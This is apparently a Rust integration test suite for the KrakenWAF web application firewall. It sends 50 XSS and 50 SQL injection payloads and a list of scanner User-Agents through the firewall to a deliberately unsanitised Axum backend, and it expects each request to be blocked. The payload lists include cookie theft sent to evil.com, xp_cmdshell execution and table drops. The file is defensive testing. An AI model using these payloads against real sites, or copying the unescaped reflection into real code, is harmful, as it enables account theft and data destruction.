
//! End-to-end integration tests: Axum micro-backend + KrakenWAF (--no-tls).
//!
//! Topology
//! --------
//!   reqwest  →  KrakenWAF :WAF_PORT (--no-tls)  →  Axum backend :9077
//!
//! The backend is started once for the whole test binary via `BACKEND_ONCE`.
//! Each test gets its own WAF port (atomically allocated) so tests can run
//! without port collisions even when the OS puts a closed socket in TIME_WAIT.
//!
//! Backend routes
//! --------------
//!   GET  /test_one   → HTML form (GET → /test_get)
//!   GET  /test_get   → renders `payload_test` query param unsanitised in <h1>
//!   GET  /test_two   → HTML form (POST → /test_post)
//!   POST /test_post  → renders `payload_test` form field unsanitised in <h1>

use axum::{
    extract::{Form, Query},
    response::Html,
    routing::{get, post},
    Router,
};
use reqwest::StatusCode;
use serde::Deserialize;
use std::{
    net::SocketAddr,
    process::{Child, Command, Stdio},
    sync::{
        atomic::{AtomicU16, Ordering},
        OnceLock,
    },
    time::Duration,
};

// ─── Port allocation ──────────────────────────────────────────────────────────

const BACKEND_PORT: u16 = 9077;
static NEXT_WAF_PORT: AtomicU16 = AtomicU16::new(9090);

fn alloc_waf_port() -> u16 {
    NEXT_WAF_PORT.fetch_add(1, Ordering::SeqCst)
}

fn backend_addr() -> String {
    format!("127.0.0.1:{BACKEND_PORT}")
}

fn waf_base(port: u16) -> String {
    format!("http://127.0.0.1:{port}")
}

// ─── Axum backend (started once) ─────────────────────────────────────────────

static BACKEND_ONCE: OnceLock<()> = OnceLock::new();

#[derive(Deserialize)]
struct Payload {
    #[serde(default)]
    payload_test: String,
}

async fn test_one() -> Html<&'static str> {
    Html(
        r#"<html><body>
           <form method="GET" action="/test_get">
             <input name="payload_test"/><input type="submit" value="Go"/>
           </form></body></html>"#,
    )
}

async fn test_get(Query(p): Query<Payload>) -> Html<String> {
    Html(format!("<h1>{}</h1>", p.payload_test))
}

async fn test_two() -> Html<&'static str> {
    Html(
        r#"<html><body>
           <form method="POST" action="/test_post">
             <input name="payload_test"/><input type="submit" value="Go"/>
           </form></body></html>"#,
    )
}

async fn test_post(Form(p): Form<Payload>) -> Html<String> {
    Html(format!("<h1>{}</h1>", p.payload_test))
}

fn ensure_backend() {
    BACKEND_ONCE.get_or_init(|| {
        let addr: SocketAddr = backend_addr().parse().unwrap();
        std::thread::spawn(move || {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
                .block_on(async move {
                    let app = Router::new()
                        .route("/test_one", get(test_one))
                        .route("/test_get", get(test_get))
                        .route("/test_two", get(test_two))
                        .route("/test_post", post(test_post));
                    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
                    axum::serve(listener, app).await.unwrap();
                });
        });
        // Allow the listener to bind before any WAF is pointed at it.
        std::thread::sleep(Duration::from_millis(300));
    });
}

// ─── WAF subprocess helpers ───────────────────────────────────────────────────

struct WafGuard(Child);

impl Drop for WafGuard {
    fn drop(&mut self) {
        self.0.kill().ok();
        self.0.wait().ok();
    }
}

fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
    let project_root = env!("CARGO_MANIFEST_DIR");
    let rules_dir = format!("{project_root}/rules");
    let listen = format!("127.0.0.1:{waf_port}");
    let upstream = format!("http://{}", backend_addr());

    let child = Command::new(env!("CARGO_BIN_EXE_krakenwaf"))
        .args([
            "--no-tls",
            "--listen",
            &listen,
            "--upstream",
            &upstream,
            "--rules-dir",
            &rules_dir,
        ])
        .args(extra_args)
        .current_dir(project_root)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("failed to spawn krakenwaf binary");

    WafGuard(child)
}

/// Poll the WAF health endpoint until it responds (or timeout).
async fn wait_for_waf(client: &reqwest::Client, waf_port: u16) {
    let health_url = format!("{}/__krakenwaf/health", waf_base(waf_port));
    for _ in 0..40 {
        if client
            .get(&health_url)
            .timeout(Duration::from_millis(300))
            .send()
            .await
            .is_ok()
        {
            return;
        }
        tokio::time::sleep(Duration::from_millis(150)).await;
    }
    panic!("KrakenWAF on port {waf_port} did not become ready in time");
}

fn http_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

// ─── Payload lists ───────────────────────────────────────────────────────────

/// 50 classic XSS payloads — all must be blocked when sent in a POST body.
const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script src=http://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "\"/><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<img src=\"javascript:alert('xss')\">",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<button onclick=alert(1)>click</button>",
    "<div onmouseover=alert(1)>hover</div>",
    "<p onmouseenter=alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:,alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
    "<script>alert`1`</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',999999)</script>",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<base href=javascript:alert(1)//>",
    "<bgsound src=javascript:alert(1)>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
];

/// 50 classic SQLi payloads — all must be blocked when sent in a GET query.
const SQLI_PAYLOADS: &[&str] = &[
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1'--",
    "' or 'x'='x",
    "1' or '1'='1",
    "1 or 1=1",
    "union select 1,2,3--",
    "union select null,null,null--",
    "union select @@version,null,null--",
    "' union select 1,2,3--",
    "' union select null,null--",
    "' union all select null--",
    "1; drop table users--",
    "1; select * from users--",
    "'; exec xp_cmdshell('dir')--",
    "'; exec master..xp_cmdshell('dir')--",
    "1 and 1=1",
    "1 and 1=2",
    "' and '1'='1",
    "' and 1=1--",
    "' and sleep(5)--",
    "1 and sleep(5)",
    "1; waitfor delay '0:0:5'--",
    "' waitfor delay '0:0:5'--",
    "1 and benchmark(5000000,md5(1))#",
    "' and (select * from (select(sleep(5)))a)--",
    "1' and extractvalue(1,concat(0x7e,(select version())))--",
    "' and updatexml(1,concat(0x7e,(select version())),1)--",
    "1 or (select 1 from dual where 1=1)--",
    "' or (select 1 from dual where 1=1)--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 2>1--",
    "' having 1=1--",
    "' group by 1--",
    "' order by 1--",
    "' order by 100--",
    "1; insert into users values('hack','hack')--",
    "1; update users set password='hack'--",
    "' or ''='",
    "' or 0=0--",
    "' or 0=0#",
    "\" or 0=0--",
    "\" or \"\"=\"",
    "' or true--",
];

/// Scanner User-Agents sampled from rules/user_agents/scanners.txt — all must
/// be blocked on any request, regardless of payload.
const SCANNER_UAS: &[&str] = &[
    "nikto/2.1.6",
    "sqlmap/1.7",
    "Nmap Scripting Engine",
    "masscan/1.3",
    "nessus/10.0",
    "openvas/21.4",
    "gobuster/3.6",
    "dirbuster/1.0",
    "arachni/1.5",
    "nuclei/2.9",
    "wfuzz/3.1",
    "commix/3.8",
    "Mozilla/5.0 (compatible; netsparker/6.0)",
    "havij/1.17",
    "Acunetix Web Vulnerability Scanner",
];

// ─── Tests ────────────────────────────────────────────────────────────────────

/// Sweep 50 XSS payloads via POST body — every one must be blocked (HTTP 403).
#[tokio::test]
async fn xss_payload_sweep_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in XSS_PAYLOADS {
        let resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for XSS payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "XSS payload not blocked: {payload:?}"
        );
    }
}

/// Sweep 50 SQLi payloads via GET query — every one must be blocked (HTTP 403).
#[tokio::test]
async fn sqli_payload_sweep_get() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in SQLI_PAYLOADS {
        let resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for SQLi payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "SQLi payload not blocked: {payload:?}"
        );
    }
}

/// Send a GET with a benign query param but a scanner User-Agent from
/// scanners.txt — the UA alone must trigger a block (HTTP 403).
#[tokio::test]
async fn scanner_ua_sweep() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for ua in SCANNER_UAS {
        let resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", "hello world")])   // clean payload
            .header("User-Agent", *ua)
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for UA {ua:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "Scanner UA not blocked: {ua:?}"
        );
    }
}

/// A request from a blocklisted IP (via X-Real-IP + trusted proxy CIDR) is
/// blocked with HTTP 403.  The IP `10.10.10.1` is present in
/// `rules/addr/blocklist.txt`; we configure the WAF to trust the loopback
/// as a proxy so the X-Real-IP header is honoured.
#[tokio::test]
async fn blocklisted_ip_is_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(
        port,
        &[
            "--real-ip-header",
            "X-Real-IP",
            "--trusted-proxy-cidrs",
            "127.0.0.1/32",
        ],
    );
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/test_one", waf_base(port)))
        .header("X-Real-IP", "10.10.10.1")
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
}

/// Clean traffic with an innocuous payload passes through and reaches the
/// backend (HTTP 200).
#[tokio::test]
async fn clean_get_passes_through() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/test_get", waf_base(port)))
        .query(&[("payload_test", "hello world")])
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::OK);
}

/// Clean POST passes through and reaches the backend (HTTP 200).
#[tokio::test]
async fn clean_post_passes_through() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/test_post", waf_base(port)))
        .form(&[("payload_test", "safe value")])
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::OK);
}
